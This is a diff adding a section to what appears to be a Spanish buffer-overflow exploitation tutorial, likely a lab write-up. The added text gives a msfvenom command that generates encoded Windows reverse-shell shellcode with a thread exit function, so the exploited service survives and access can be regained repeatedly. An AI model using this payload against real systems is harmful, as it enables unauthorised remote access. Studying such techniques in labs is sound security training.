@@ -429,3 +429,16 @@ La razón por la cual se han insertado los **NOP-sled** (\x90) antes de nuestro 
 Ya teniendo todo esto hecho, lo único que queda es ejecutar el script teniendo previamente una sesión vía Netcat en escucha. 
 
 Tras su ejecución, ganaremos acceso al sistema, con la desventaja de que una vez matada la sesión, en caso de volver a ejecutar el script... no ganaremos más veces sesión al sistema. Arreglaremos esto en el siguiente punto.
+
+-   Mejorando el Exploit
+
+De forma opcional, en caso de querer tras la ejecución del exploit poder continuamente acceder al sistema sin que el servicio corrompa, lo único que tenemos que hacer como variante al generar nuestro shellcode es lo siguiente:
+
+```
+$~ msfvenom -p windows/shell_reverse_tcp lhost=127.0.0.1 lport=443 EXITFUNC=thread -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f c
+```
+De esta forma, variamos la función de salida a un modo hilo... haciendo que lo que muera sea el hilo en vez del proceso padre. El Shellcode generado tendrá el mismo tamaño (351 bytes), lo único que habrá que hacer será sutituir el Shellcode por el nuevo generado desde msfvenom.
+
+Tras su ejecución, se podrá comprobar como independientemente del número de veces que se ejecute el exploit, ganaremos siempre acceso al sistema.
+
+-   Reducción de Tamaño + Acceso por Powershell
